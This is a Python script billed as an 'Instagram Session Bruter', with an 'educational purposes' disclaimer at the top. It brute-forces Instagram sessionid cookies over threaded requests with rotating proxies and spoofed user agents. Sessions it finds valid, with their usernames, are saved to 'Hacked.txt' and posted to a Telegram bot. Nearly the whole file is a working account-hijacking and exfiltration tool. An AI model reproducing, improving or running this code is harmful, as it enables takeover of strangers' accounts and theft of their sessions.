'''

This program is for educational purposes and to spread awarness about how cookies work 
on the social media platform Instagram.

Please do not use it in a way to harm other people or to commit a cyber crime.

Intagram: @a7.acc
Telegram: @A7_acc

'''
import requests, threading
from random import choice
from os import system
from colored import fg,attr
from user_agent import generate_user_agent


# Markers
g = lambda x : fg('green')+x+attr('reset')
rod = lambda x : fg('red')+x+attr('reset')
b = lambda x : fg('blue')+x+attr('reset')
y = lambda x : fg('yellow')+x+attr('reset')
c = lambda x : fg('cyan')+x+attr('reset')
m = lambda x : fg('magenta')+x+attr('reset')
exl = '['+rod('!')+']'
ques = '['+m('?')+']'
ha  ='['+g('#')+']'
mult = '['+c('*')+']'
clear = lambda: system("cls")
clear()

logo = rod(f'''
 ,/         \.
 ((           ))         
  \`.       ,'/          
   )')     (`(             
 ,'`/       \,`.     
(`-(         )-')
 \-'\,-'"`-./`-/ 
  \-')     (`-/  
  /`'       `'\   
 (  _       _  ) 
 | ( \     / ) |
 |  `.\   /,'  |
 |    `\ /'    |     {m('INSTAGRAM SESSION BRUTER')}
 (             )
  \           /
   \         /
    `.     ,'           
      `-.-''')+f'\n           Program By IG: {b("@a7.acc")}'
print(logo)


# A function that creates random strings
def ra(length,ty):
    if ty == 'a0':#   Small letters only with numbers
        randoms = ''.join('qwertyuiopasdfghjklzxcvbnm1234567890')
    elif ty == 'A0':# Capital letters only with numbers
        randoms = ''.join('QWERTYUIOPASDFGHJKLZXCVBNM1234567890')
    elif ty == 'Az':# Capital and small letters only
        randoms = ''.join('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm')
    elif ty == 'All':#Capital and small letters and numbers
        randoms = ''.join('QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890')
    elif ty == 'a':#  Small letters only
        randoms = ''.join('qwertyuiopasdfghjklzxcvbnm')
    elif ty == 'n':#  Numbers only
        randoms = ''.join('1234567890')
    random_str = ''
    for _ in range(int(length)):
        random_str += choice(randoms)
    return random_str


# Sends the hit on telegram. Your telegram info should be in this format token/id in a text file named tele.txt
def send_info(info):
    try:
        if telegram == 'y':
            with open('tele.txt','r') as fa:
                tokid = fa.read().split('/')
                requests.post(f'https://api.telegram.org/bot{tokid[0]}/sendMessage?chat_id={tokid[1]}&text={info}')
    except:
        pass
    with open('Hacked.txt','a') as hackyro:
        hackyro.write(info+'\n')



index = 0
numbers = [i for i in range(0,20)]
bad = 0
good = 0

# Checking function
def check():
    global index,bad ,good
    while True:
        system(f'title ALL:{str(good+bad)}   GOOD:{str(good)}   BAD:{str(bad)}   THREADS:{str(threading.active_count()-1)}')
        if isUserid:
            try:
                log = str(user_ids[index])+'%3A'+ra(14,'All')+'%3A'+str(choice(numbers))
                index += 1
            except:
                index = 0
                log = str(user_ids[index])+'%3A'+ra(14,'All')+'%3A'+str(choice(numbers))
                index += 1
        else:
            log = ra(choice([9,10,11]),'n')+'%3A'+ra(14,'All')+'%3A'+str(choice(numbers))
        
        usrid = log.split("%")[0]
        logged = False
        while True:
            try:
                the_cookie = f'sessionid={log};shbid={ra(5,"n")}; shbts={ra(10,"n")}.{ra(7,"n")}; datr={ra(12,"All")}_{ra(11,"All")}; ds_user_id={usrid}'
                req = requests.get('https://www.instagram.com/',headers={'user-agent':generate_user_agent(),'cookie':the_cookie},proxies=choice(proxies),timeout=5)
                if 'no-js not-logged-in client-root' in req.text:
                    bad += 1
                    system(f'title ALL:{str(good+bad)}   GOOD:{str(good)}   BAD:{str(bad)}   THREADS:{str(threading.active_count()-1)}')
                    break
                elif ' logged-in ' in req.text or usrid in req.text:
                    good += 1
                    logged = True
                    system(f'title ALL:{str(good+bad)}   GOOD:{str(good)}   BAD:{str(bad)}   THREADS:{str(threading.active_count()-1)}')
                    print(ha+' Valid session! : '+str(log))
                    break
            except:
                pass


        if logged:
            try:
                username = req.text.split('\\"username\\":\\"')[1].split('\\",\\"badge_co')[0]
            except:
                try:
                    req = requests.get('https://www.instagram.com/',headers={'user-agent':generate_user_agent(),'cookie':f'sessionid={log};'})
                    username = req.text.split('"username":"')[1].split('","badge_cou')[0]
                except:
                    username = 'NOT FOUND!'
                    pass
            info = 'Valid session! : '+str(log)+'\nFull Cookie : '+the_cookie+'\nUsername : '+username+'\n------ Program By @A7_acc ------'
            send_info(info)
            print(ha+' Username: '+str(username)+'\n')

# Executing all the threads
def start_threads(amount):
    for _ in range(int(amount)):
        try:
            thread1 = threading.Thread(target=check)
            thread1.start()
        except:
            pass

# The main function of the program / the start point
def main():
    global isUserid,user_ids,telegram,proxies
    option = input('.\n.\n┌───'+ques+f' Select An Option \n└──>> [{b("A")}] Use Existing USERID\'s \n└──>> [{b("B")}] Generate Random USERID\'s \n└──────────────>> ').lower()
    if option == 'a':
        isUserid = True
        file = input('.\n.\n┌───'+ques+f' Enter the file name of the USER ID\'s\n└─────────────────>> ')
        if not file.endswith('.txt'):
            file += '.txt'

        # deepcode ignore PT: <please specify a reason of ignoring this>
        with open(file,'r',encoding='utf-8') as ff:
            user_ids = ff.read().splitlines()
    else:
        isUserid = False

    print(exl+' You should use proxies otherwise the program won\'t work')
    proxies = input('.\n.\n┌───'+ques+f' Enter The Name Of The Proxy File \n└──────────────>> ').lower()
    if '.txt' not in proxies:
        proxies += '.txt'

    try:
        # deepcode ignore PT: 
        with open(proxies,'r',encoding='utf-8') as pr:
            prxs = pr.read().splitlines()
    except Exception as err:
        print(exl+' Error while openning the file > '+y(str(err)))

    
    proxies = []
    typp = input('.\n.\n┌───'+ques+f" Enter the proxies type:\n└──>>[{c('1')}] HTTP/S\n└──>>[{c('2')}] SOCKS4\n└──>>[{c('3')}] SOCKS5\n└─────────>> ")
    for pr in prxs:
        if typp == '1':
            proxies.append({
                'http':f'https://{pr}',
                'https':f'http://{pr}'
        })
        elif typp == '2':
            proxies.append({
                'http':f'socks4://{pr}',
                'https':f'socks4://{pr}'
        })
        else:
            proxies.append({
                'http':f'socks5://{pr}',
                'https':f'socks5://{pr}'
        })



    print('\n'+mult+f' Enter your telegram bot information in this format {c("token/id")} in {b("tele.txt")} file.')
    print(mult+f' You may NOT recieve all the hacked sessions on Telegram.. Anyhow, all the sessions will be in '+c('Hacked.txt '))
    telegram = input('.\n.\n┌───'+ques+' Do you want to get Hacked Sessions also on telegram? (Y/n) \n└──────────────>> ').lower()

    threads = input('.\n.\n┌───'+ques+f' Enter The Amount Of Threads You Want To Use\n└─────────────────>> ')
    clear()
    print(logo)
    start_threads(threads)

main()
